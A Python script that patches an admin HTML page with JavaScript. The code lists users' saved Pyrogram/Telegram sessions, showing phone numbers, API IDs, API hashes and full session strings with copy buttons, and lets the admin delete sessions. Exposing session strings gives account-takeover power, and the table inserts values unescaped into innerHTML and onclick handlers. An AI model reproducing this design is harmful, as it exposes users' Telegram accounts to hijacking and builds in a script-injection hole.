with open('web/admin.html', 'r') as f:
    content = f.read()

js_code = """
        // ==========================================
        // PYROGRAM USER BOT ADMIN FUNCTIONS
        // ==========================================
        async function loadAdminPyrograms() {
            try {
                const res = await fetch('/api/admin/pyrogram/list');
                const data = await res.json();
                const tbody = document.getElementById('adminPyrogramList');
                if(!tbody) return;

                if (!data.success || !data.sessions || data.sessions.length === 0) {
                    tbody.innerHTML = '<tr><td colspan="6" class="p-4 text-center text-gray-500 text-sm">No Pyrogram sessions saved by users yet.</td></tr>';
                    return;
                }

                tbody.innerHTML = data.sessions.map(s => `
                    <tr class="hover:bg-white/5 transition border-b border-white/5">
                        <td class="p-3">
                            <div class="text-sm font-bold text-white">${s.username || 'User'}</div>
                            <div class="text-xs text-gray-400">#${s.userId}</div>
                        </td>
                        <td class="p-3 text-sm text-gray-300">
                            ${s.phoneNumber} <i class="fas fa-copy ml-1 cursor-pointer hover:text-white" onclick="copyText('${s.phoneNumber}')" title="Copy Number"></i>
                        </td>
                        <td class="p-3 text-sm text-gray-300">
                            ${s.apiId} <i class="fas fa-copy ml-1 cursor-pointer hover:text-white" onclick="copyText('${s.apiId}')" title="Copy API ID"></i>
                        </td>
                        <td class="p-3 text-sm text-gray-300 truncate max-w-[100px]" title="${s.apiHash}">
                            ${s.apiHash.substring(0,6)}... <i class="fas fa-copy ml-1 cursor-pointer hover:text-white" onclick="copyText('${s.apiHash}')" title="Copy API Hash"></i>
                        </td>
                        <td class="p-3 text-sm text-gray-300 truncate max-w-[150px]" title="${s.sessionString}">
                            ${s.sessionString.substring(0,10)}... <i class="fas fa-copy ml-1 cursor-pointer hover:text-white" onclick="copyText('${s.sessionString}')" title="Copy Session"></i>
                        </td>
                        <td class="p-3 text-right">
                            <button onclick="adminDeletePyrogram('${s.id}')" class="text-red-400 hover:text-red-300 p-1">
                                <i class="fas fa-trash"></i>
                            </button>
                        </td>
                    </tr>
                `).join('');
            } catch (err) {
                console.error(err);
            }
        }

        async function adminDeletePyrogram(id) {
            if (!confirm('Are you sure you want to delete this session permanently?')) return;
            try {
                const res = await fetch('/api/admin/pyrogram/' + id, { method: 'DELETE' });
                const data = await res.json();
                if (data.success) {
                    showToast('Session deleted', 'success');
                    loadAdminPyrograms();
                } else {
                    showToast(data.message || 'Error deleting', 'error');
                }
            } catch (err) {
                console.error(err);
                showToast('Error', 'error');
            }
        }

        async function adminDeleteAllPyrogram() {
            if (!confirm('WARNING: This will permanently delete ALL Pyrogram sessions from the database. Are you sure?')) return;
            try {
                const res = await fetch('/api/admin/pyrogram/all', { method: 'DELETE' });
                const data = await res.json();
                if (data.success) {
                    showToast('All sessions deleted', 'success');
                    loadAdminPyrograms();
                } else {
                    showToast(data.message || 'Error deleting', 'error');
                }
            } catch (err) {
                console.error(err);
                showToast('Error', 'error');
            }
        }
"""

content = content.replace("        // ==========================================\n        //  FILE UPLOAD LOGIC", js_code + "\n        // ==========================================\n        //  FILE UPLOAD LOGIC")

with open('web/admin.html', 'w') as f:
    f.write(content)
